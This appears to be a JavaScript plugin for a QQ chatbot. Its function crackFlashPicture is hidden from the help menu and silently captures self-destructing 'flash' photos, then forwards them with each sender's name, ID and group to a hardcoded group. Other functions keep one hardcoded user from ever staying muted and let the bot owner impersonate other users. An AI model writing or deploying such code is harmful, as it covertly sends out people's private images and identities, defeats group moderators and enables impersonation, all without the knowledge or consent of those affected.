import {segment} from 'oicq'
import fetch from 'node-fetch'

//项目路径
const _path = process.cwd()

let pretendSomeoneReg = "^#伪装_(\\d+)_(.+)$"

export const rule = {
  pretendSomeone: {
    reg: pretendSomeoneReg,
    priority: 1, 
    describe: "伪装某人",
  },
  // 自动破解闪照
  crackFlashPicture: {
    reg: '',
    priority: 0,
    describe: "自动破解闪照",
    // 私有指令，不会自动生成到 #帮助 视图中
    isPrivate: true,
  }
}

export async function crackFlashPicture(e){
  for(let msg of e.message) {
    // flash 闪照
    if (msg.type === 'flash') {
      Bot.logger.mark(`得到闪照: ${msg.url}`);
      let replyMsg = [
        `已自动破解闪照\n`,
        `发送群：${e.group.name}（${e.group.group_id}）\n`,
        `发送者：${e.sender.nickname}（${e.sender.user_id}）\n`,
        segment.image(msg.url),
      ]
      let groupId = 146415771
      Bot.pickGroup(groupId).sendMsg(replyMsg)
      // 自动向Master转发消息（也可以在这里改成指定QQ）
      // let userId = BotConfig.masterQQ[0]
      // Bot.pickUser(userId).sendMsg(replyMsg)
    }
  }
}

export async function doUnmuteMaster(e){
  if ((e.user_id == 1356496272) && e.duration > 0) {
      setTimeout(function() {
          e.group.muteMember(e.user_id, 0)
      }, 1500);
  }
}

export async function pretendSomeone(e){
  if (!e.isMaster) {
    return
  }
  let reg = new RegExp(pretendSomeoneReg)
  let matchs = e.msg.match(reg)
  e.user_id = matchs[1]
  e.msg =  matchs[2]
  e.isMaster = false
}